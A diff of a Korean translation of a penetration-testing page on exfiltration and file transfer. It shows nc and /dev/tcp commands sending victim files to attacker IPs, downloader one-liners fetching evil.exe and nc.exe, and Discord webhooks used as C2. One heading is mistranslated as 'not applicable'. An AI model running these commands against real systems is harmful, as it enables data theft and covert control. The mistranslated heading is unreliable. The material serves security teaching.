@@ -2,11 +2,18 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Commonly whitelisted domains to exfiltrate information
+> [!TIP]
+> 엔드투엔드 예제로 `C:\Users\Public`에 loot를 staging하고 Rclone으로 exfiltrating하여 합법적인 백업을 모방하는 워크플로를 보려면 아래를 검토하세요.
 
-공격에 악용될 수 있는 일반적으로 화이트리스트에 등록된 도메인을 찾으려면 [https://lots-project.com/](https://lots-project.com/)을 확인하세요
+{{#ref}}
+../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
+{{#endref}}
 
-## Copy\&Paste Base64
+## 정보를 exfiltrate하기 위해 일반적으로 whitelisted된 도메인
+
+남용될 수 있는 일반적으로 whitelisted된 도메인을 찾으려면 [https://lots-project.com/](https://lots-project.com/)을 확인하세요
+
+## 복사\&붙여넣기 Base64
 
 **Linux**
 ```bash
@@ -59,7 +66,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **HTTPS 서버**
+### **HTTPS Server**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -102,12 +109,12 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ```
 ## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
 
-Webhooks는 JSON과 선택적 파일 파트를 허용하는 쓰기 전용 HTTPS 엔드포인트입니다. 신뢰된 SaaS 도메인에 일반적으로 허용되며 OAuth/API 키가 필요 없기 때문에 저마찰 beaconing 및 exfiltration에 유용합니다.
+Webhooks는 JSON과 선택적 파일 파트를 받는 쓰기 전용 HTTPS 엔드포인트입니다. 일반적으로 신뢰된 SaaS 도메인에 허용되며 OAuth/API 키가 필요하지 않아 마찰이 적은 beaconing 및 exfiltration에 유용합니다.
 
 Key ideas:
-- Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
-- POST multipart/form-data로, payload_json이라는 파트에 {"content":"..."}를 넣고 선택적 file 파트(이름: file)를 추가합니다.
-- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK이 전송을 확인합니다.
+- 엔드포인트: Discord uses https://discord.com/api/webhooks/<id>/<token>
+- POST multipart/form-data에서 payload_json이라는 파트에 {"content":"..."}를 포함해 전송하고, 선택적 file이라는 이름의 파일 파트(들)를 첨부할 수 있습니다.
+- Operator 루프 패턴: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK가 전달을 확인합니다.
 
 PowerShell PoC (Discord):
 ```powershell
@@ -178,7 +185,7 @@ Start-Sleep -Seconds 20
 }
 ```
 참고:
-- 유사한 패턴은 incoming webhooks를 사용하는 다른 협업 플랫폼(Slack/Teams)에도 적용됩니다. URL과 JSON 스키마를 적절히 조정하세요.
+- 유사한 패턴은 incoming webhooks를 사용하는 다른 협업 플랫폼(Slack/Teams)에도 적용됩니다; URL과 JSON schema를 적절히 조정하세요.
 - Discord Desktop 캐시 아티팩트의 DFIR 및 webhook/API 복구에 대해서는 다음을 참조하세요:
 
 {{#ref}}
@@ -187,17 +194,17 @@ Start-Sleep -Seconds 20
 
 ## FTP
 
-### FTP server (python)
+### FTP 서버 (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTP server (NodeJS)
+### FTP 서버 (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-### FTP 서버 (pure-ftp)
+### FTP server (pure-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -235,7 +242,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-또는 smb 공유를 **samba를 사용하여**:
+또는 smb 공유를 **samba를 사용하여** 생성:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -266,20 +273,20 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-victim에 SSH가 있으면, attacker는 victim의 directory를 attacker로 mount할 수 있다.
+victim에 SSH가 있는 경우, attacker는 victim의 디렉토리를 attacker로 마운트할 수 있다.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
-## NC
+## 해당 없음
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### 피해자에서 파일 다운로드
+### victim으로부터 파일 다운로드
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
@@ -313,33 +320,33 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-데이터를 SMTP 서버로 보낼 수 있다면, python으로 데이터를 수신할 SMTP 서버를 만들 수 있습니다:
+데이터를 SMTP 서버로 보낼 수 있다면, python으로 데이터를 수신하는 SMTP를 생성할 수 있습니다:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-기본적으로 XP와 2003에는 포함되어 있습니다 (다른 버전에서는 설치 시 명시적으로 추가해야 합니다)
+XP와 2003에서는 기본적으로 포함되어 있음(다른 버전에서는 설치 중에 명시적으로 추가해야 함)
 
-Kali에서, **start TFTP server**:
+Kali에서는 **start TFTP server**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**TFTP server (python으로):**
+**python으로 구현한 TFTP 서버:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-**victim**에서 Kali 서버에 연결하세요:
+**victim**에서 Kali 서버에 연결:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-PHP oneliner로 파일을 다운로드:
+PHP 원라이너로 파일 다운로드:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -381,13 +388,13 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe` 프로그램은 바이너리 검사뿐만 아니라 **hex에서 다시 빌드하는 기능**도 제공합니다. 즉, 바이너리의 hex를 제공하면 `debug.exe`가 해당 바이너리 파일을 생성할 수 있습니다. 다만, debug.exe는 **최대 64 kb까지의 파일만 어셈블할 수 있는 제한**이 있다는 점에 유의해야 합니다.
+`debug.exe` 프로그램은 binaries를 검사할 수 있을 뿐만 아니라 **hex로부터 이를 재구성할 수 있는 기능**도 제공합니다. 즉, binary의 hex를 제공하면 `debug.exe`가 해당 binary 파일을 생성할 수 있습니다. 다만 debug.exe는 **최대 64 kb 크기의 파일까지만 assembling할 수 있다는 제한**이 있다는 점을 유의해야 합니다.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-그런 다음 해당 텍스트를 windows-shell에 복사해 붙여넣으면 nc.exe라는 파일이 생성됩니다.
+그런 다음 텍스트를 windows-shell에 복사-붙여넣으면 nc.exe라는 파일이 생성됩니다.
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
@@ -395,7 +402,7 @@ wine exe2bat.exe nc.exe nc.txt
 
 - [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
 
-## 참고자료
+## 참고 자료
 
 - [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
 - [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
